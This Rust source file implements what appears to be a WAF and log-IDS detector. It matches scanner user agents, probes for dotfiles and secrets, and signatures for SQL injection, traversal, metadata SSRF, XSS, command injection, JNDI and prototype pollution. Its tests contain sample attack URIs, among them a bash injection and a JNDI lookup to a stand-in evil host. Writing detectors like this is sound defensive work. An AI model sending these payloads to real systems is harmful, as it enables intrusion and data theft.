use aho_corasick::{AhoCorasick, AhoCorasickBuilder, MatchKind};
use std::sync::OnceLock;

#[derive(Debug, Clone, Copy, PartialEq, Eq)]
enum ExploitKind {
    Sqli,
    PathTraversal,
    MetadataSsrf,
    XssProbe,
    CmdInjection,
    JndiSsti,
    PrototypePollution,
}

impl ExploitKind {
    const fn as_str(self) -> &'static str {
        match self {
            Self::Sqli => "sqli",
            Self::PathTraversal => "path_traversal",
            Self::MetadataSsrf => "metadata_ssrf",
            Self::XssProbe => "xss_probe",
            Self::CmdInjection => "cmd_injection",
            Self::JndiSsti => "jndi_ssti",
            Self::PrototypePollution => "prototype_pollution",
        }
    }
}

struct ExploitAutomaton {
    ac: AhoCorasick,
    kinds: Vec<ExploitKind>,
}

const SCANNER_USER_AGENTS: &[&str] = &[
    "sqlmap",
    "nuclei",
    "nikto",
    "ffuf",
    "gobuster",
    "feroxbuster",
    "masscan",
    "zgrab",
    "dirbuster",
    "wpscan",
    "acunetix",
    "nessus",
    "openvas",
    "havij",
    "dalfox",
    "commix",
    "nmap scripting engine",
];

const CANARY_EXACT_OR_PREFIXES: &[&str] = &[
    "/.env",
    "/.git",
    "/.aws",
    "/.ssh",
    "/.svn",
    "/.ds_store",
    "/.docker",
    "/.kube",
    "/.pypirc",
    "/.npmrc",
    "/.netrc",
    "/wp-admin",
    "/wp-login.php",
    "/wp-includes",
    "/xmlrpc.php",
    "/phpmyadmin",
    "/pma",
    "/admin.php",
    "/config.php",
    "/vendor/phpunit",
    "/actuator",
    "/server-status",
    "/server-info",
    "/cgi-bin/",
];

const SENSITIVE_DUMP_SUFFIXES: &[&str] = &[
    ".sql", ".sql.gz", ".bak", ".old", ".swp", ".orig", ".env.bak",
];

const EXPLOIT_PATTERNS: &[(&str, ExploitKind)] = &[
    ("union select", ExploitKind::Sqli),
    ("union all select", ExploitKind::Sqli),
    ("waitfor delay", ExploitKind::Sqli),
    ("pg_sleep(", ExploitKind::Sqli),
    ("select sleep(", ExploitKind::Sqli),
    ("benchmark(", ExploitKind::Sqli),
    ("' or 1=1", ExploitKind::Sqli),
    ("' or '1'='1", ExploitKind::Sqli),
    ("\" or \"1\"=\"1", ExploitKind::Sqli),
    ("information_schema", ExploitKind::Sqli),
    ("../etc/passwd", ExploitKind::PathTraversal),
    ("../etc/shadow", ExploitKind::PathTraversal),
    ("../proc/self", ExploitKind::PathTraversal),
    ("../win.ini", ExploitKind::PathTraversal),
    ("..\\win.ini", ExploitKind::PathTraversal),
    ("..\\etc\\passwd", ExploitKind::PathTraversal),
    ("/etc/passwd", ExploitKind::PathTraversal),
    ("/etc/shadow", ExploitKind::PathTraversal),
    ("/proc/self/environ", ExploitKind::PathTraversal),
    ("169.254.169.254", ExploitKind::MetadataSsrf),
    ("fd00:ec2::254", ExploitKind::MetadataSsrf),
    ("metadata.google.internal", ExploitKind::MetadataSsrf),
    ("100.100.100.200", ExploitKind::MetadataSsrf),
    ("192.0.0.192", ExploitKind::MetadataSsrf),
    ("<script", ExploitKind::XssProbe),
    ("javascript:", ExploitKind::XssProbe),
    ("onerror=", ExploitKind::XssProbe),
    ("onload=", ExploitKind::XssProbe),
    ("<svg/onload", ExploitKind::XssProbe),
    (";/bin/sh", ExploitKind::CmdInjection),
    ("|/bin/sh", ExploitKind::CmdInjection),
    (";/bin/bash", ExploitKind::CmdInjection),
    ("|/bin/bash", ExploitKind::CmdInjection),
    ("`id`", ExploitKind::CmdInjection),
    ("$(whoami)", ExploitKind::CmdInjection),
    ("$(id)", ExploitKind::CmdInjection),
    ("${jndi:", ExploitKind::JndiSsti),
    ("{{7*7}}", ExploitKind::JndiSsti),
    ("${7*7}", ExploitKind::JndiSsti),
    ("__proto__", ExploitKind::PrototypePollution),
    ("constructor[prototype]", ExploitKind::PrototypePollution),
    ("constructor.prototype", ExploitKind::PrototypePollution),
];

static SCANNER_UA_AC: OnceLock<AhoCorasick> = OnceLock::new();
static EXPLOIT_AC: OnceLock<ExploitAutomaton> = OnceLock::new();

fn scanner_ua_ac() -> &'static AhoCorasick {
    SCANNER_UA_AC.get_or_init(|| {
        AhoCorasickBuilder::new()
            .ascii_case_insensitive(true)
            .match_kind(MatchKind::LeftmostFirst)
            .build(SCANNER_USER_AGENTS)
            .expect("Scanner UA AhoCorasick automaton must compile")
    })
}

fn exploit_ac() -> &'static ExploitAutomaton {
    EXPLOIT_AC.get_or_init(|| {
        let mut pats = Vec::with_capacity(EXPLOIT_PATTERNS.len());
        let mut kinds = Vec::with_capacity(EXPLOIT_PATTERNS.len());
        for &(pat, kind) in EXPLOIT_PATTERNS {
            pats.push(pat);
            kinds.push(kind);
        }
        let ac = AhoCorasickBuilder::new()
            .ascii_case_insensitive(true)
            .match_kind(MatchKind::LeftmostFirst)
            .build(&pats)
            .expect("Exploit signature AhoCorasick automaton must compile");
        ExploitAutomaton { ac, kinds }
    })
}

/// Returns `true` if `user_agent` matches a known automated exploit/recon scanner in `< 1 µs`.
#[inline]
pub fn is_scanner_user_agent(user_agent: &str) -> bool {
    if user_agent.len() < 4 {
        return false;
    }
    scanner_ua_ac().is_match(user_agent)
}

/// Matches browser DevTools `.js.map` / `.css.map` requests (return 404 without banning CGNAT IP).
pub fn is_sourcemap_probe(path: &str) -> bool {
    let raw = path.trim();
    let mut buf = [0u8; 4096];
    let decoded = if raw.len() <= 4096 && raw.contains('%') {
        let (n, _) = decode_percent_stack(raw.as_bytes(), &mut buf);
        std::str::from_utf8(&buf[..n]).unwrap_or(raw)
    } else {
        raw
    };
    let low = decoded.to_ascii_lowercase();
    let no_query = low.split(&['?', '#'][..]).next().unwrap_or(&low);
    no_query.ends_with(".js.map") || no_query.ends_with(".css.map")
}

/// Matches decoy canary endpoints, nested dotfiles (`/api/.env`, `/v1/.git/HEAD`),
/// and DB/backup dumps (including percent-encoded `/%2eenv`) while exempting RFC 8615 `/.well-known/*`.
pub fn is_canary_or_dotfile_probe(path: &str) -> bool {
    let raw = path.trim();
    let mut pass1 = [0u8; 4096];
    let mut pass2 = [0u8; 4096];
    let decoded = if raw.len() <= 4096 && raw.contains('%') {
        let (n1, _) = decode_percent_stack(raw.as_bytes(), &mut pass1);
        let (n2, _) = decode_percent_stack(&pass1[..n1], &mut pass2);
        std::str::from_utf8(&pass2[..n2]).unwrap_or(raw)
    } else {
        raw
    };
    let low = decoded.to_ascii_lowercase();
    if low.starts_with("/.well-known/") || low == "/.well-known" {
        return false;
    }
    if CANARY_EXACT_OR_PREFIXES.iter().any(|p| {
        low == *p
            || low
                .strip_prefix(*p)
                .is_some_and(|rest| rest.starts_with('/') || rest.starts_with('.'))
    }) {
        return true;
    }
    if SENSITIVE_DUMP_SUFFIXES.iter().any(|ext| low.ends_with(ext)) {
        return true;
    }
    let no_query = low.split(&['?', '#'][..]).next().unwrap_or(&low);
    for seg in no_query.split('/') {
        if seg.is_empty() {
            continue;
        }
        if seg == ".env"
            || seg.starts_with(".env.")
            || seg == ".git"
            || seg == ".aws"
            || seg == ".ssh"
            || seg == ".svn"
            || seg == ".htpasswd"
            || seg == ".htaccess"
            || seg == ".pypirc"
            || seg == ".npmrc"
            || seg == ".netrc"
        {
            return true;
        }
    }
    let trimmed_root = no_query.trim_start_matches('/');
    if let Some(rest) = trimmed_root.strip_prefix('.') {
        if let Some(first) = rest.as_bytes().first().copied() {
            if first.is_ascii_alphanumeric() || first == b'_' || first == b'-' {
                return true;
            }
        }
    }
    false
}

/// Rejects HTTP/WebDAV/proxy verbs that legitimate browsers and telemetry SDKs never emit.
#[inline]
pub fn is_anomalous_http_method(method: &str) -> bool {
    matches!(
        method,
        "TRACE"
            | "TRACK"
            | "CONNECT"
            | "PROPFIND"
            | "PROPPATCH"
            | "MKCOL"
            | "COPY"
            | "MOVE"
            | "LOCK"
            | "UNLOCK"
            | "SEARCH"
            | "DEBUG"
    )
}

#[inline]
fn hex_nibble(b: u8) -> Option<u8> {
    match b {
        b'0'..=b'9' => Some(b - b'0'),
        b'a'..=b'f' => Some(b - b'a' + 10),
        b'A'..=b'F' => Some(b - b'A' + 10),
        _ => None,
    }
}

/// Zero-heap 2-pass stack decoder normalizing `%XX` and `+` for bounded URIs (`<= 4096` bytes).
fn decode_percent_stack(input: &[u8], out: &mut [u8]) -> (usize, bool) {
    let mut r = 0usize;
    let mut w = 0usize;
    let mut had_null = false;
    let limit = input.len();
    while r < limit && w < out.len() {
        let b = input[r];
        if b == 0 {
            had_null = true;
            r += 1;
            continue;
        }
        if b == b'%' && r + 2 < limit {
            if let (Some(hi), Some(lo)) = (hex_nibble(input[r + 1]), hex_nibble(input[r + 2])) {
                let decoded = (hi << 4) | lo;
                if decoded == 0 {
                    had_null = true;
                } else {
                    out[w] = decoded;
                    w += 1;
                }
                r += 3;
                continue;
            }
        }
        out[w] = if b == b'+' { b' ' } else { b };
        w += 1;
        r += 1;
    }
    (w, had_null)
}

/// Single-pass SIMD text probe matcher (`< 1 µs`) used by both the Edge WAF and Log-IDS.
pub fn detect_probe_in_bytes(text: &[u8]) -> Option<&'static str> {
    if text.len() < 4 {
        return None;
    }
    let eng = exploit_ac();
    if let Some(m) = eng.ac.find(text) {
        return Some(eng.kinds[m.pattern()].as_str());
    }
    None
}

/// Zero-allocation `< 1 µs` HTTP URI/query exploit inspector with 2-pass percent-decoding.
/// Immune to ReDoS and CPU amplification attacks.
pub fn detect_http_exploit_probe(raw_uri: &str) -> Option<&'static str> {
    let raw = raw_uri.as_bytes();
    if raw.len() > 4096 {
        return Some("uri_overflow");
    }
    if memchr::memchr(0, raw).is_some() {
        return Some("null_byte");
    }
    if let Some(hit) = detect_probe_in_bytes(raw) {
        return Some(hit);
    }
    if memchr::memchr(b'%', raw).is_some() || memchr::memchr(b'+', raw).is_some() {
        let mut pass1 = [0u8; 4096];
        let (len1, null1) = decode_percent_stack(raw, &mut pass1);
        if null1 {
            return Some("null_byte");
        }
        if let Some(hit) = detect_probe_in_bytes(&pass1[..len1]) {
            return Some(hit);
        }
        if memchr::memchr(b'%', &pass1[..len1]).is_some() {
            let mut pass2 = [0u8; 4096];
            let (len2, null2) = decode_percent_stack(&pass1[..len1], &mut pass2);
            if null2 {
                return Some("null_byte");
            }
            return detect_probe_in_bytes(&pass2[..len2]);
        }
    }
    None
}

#[cfg(test)]
mod tests {
    use super::*;

    #[test]
    fn simd_waf_detects_double_encoded_traversal_sqli_ssrf_xss_cmdi_and_proto() {
        assert_eq!(
            detect_http_exploit_probe("/search?q=%252e%252e%252fetc%252fpasswd"),
            Some("path_traversal")
        );
        assert_eq!(
            detect_http_exploit_probe("/items?id=1+UNION+ALL+SELECT+1,password+FROM+users"),
            Some("sqli")
        );
        assert_eq!(
            detect_http_exploit_probe(
                "/proxy?url=http://[::ffff:169.254.169.254]/latest/meta-data"
            ),
            Some("metadata_ssrf")
        );
        assert_eq!(
            detect_http_exploit_probe("/proxy?url=http://[fd00:ec2::254]/latest/meta-data"),
            Some("metadata_ssrf")
        );
        assert_eq!(
            detect_http_exploit_probe("/q?name=<script>alert(1)</script>"),
            Some("xss_probe")
        );
        assert_eq!(
            detect_http_exploit_probe("/run?cmd=foo;/bin/bash+-i"),
            Some("cmd_injection")
        );
        assert_eq!(
            detect_http_exploit_probe("/login?u=${jndi:ldap://evil.example/a}"),
            Some("jndi_ssti")
        );
        assert_eq!(
            detect_http_exploit_probe("/update?__proto__[isAdmin]=true"),
            Some("prototype_pollution")
        );
        assert_eq!(
            detect_http_exploit_probe("/file?name=a%2500.png"),
            Some("null_byte")
        );

        // Benign paths and search queries must never false-positive
        assert_eq!(
            detect_http_exploit_probe(
                "/api/0/organizations/acme/issues/?query=TypeError+in+app.js&sort=last_seen"
            ),
            None
        );
        assert!(is_scanner_user_agent("Mozilla/5.0 sqlmap/1.8"));
        assert!(!is_scanner_user_agent("Mozilla/5.0 Chrome/131.0"));
        assert!(is_canary_or_dotfile_probe("/.pypirc"));
        assert!(is_canary_or_dotfile_probe("/%2eenv"));
        assert!(is_sourcemap_probe("/assets/app.js.map"));
        assert!(!is_canary_or_dotfile_probe("/assets/app.js.map"));
        assert!(!is_canary_or_dotfile_probe("/.well-known/security.txt"));
        assert!(!is_canary_or_dotfile_probe("/.well-known/webauthn"));
    }
}
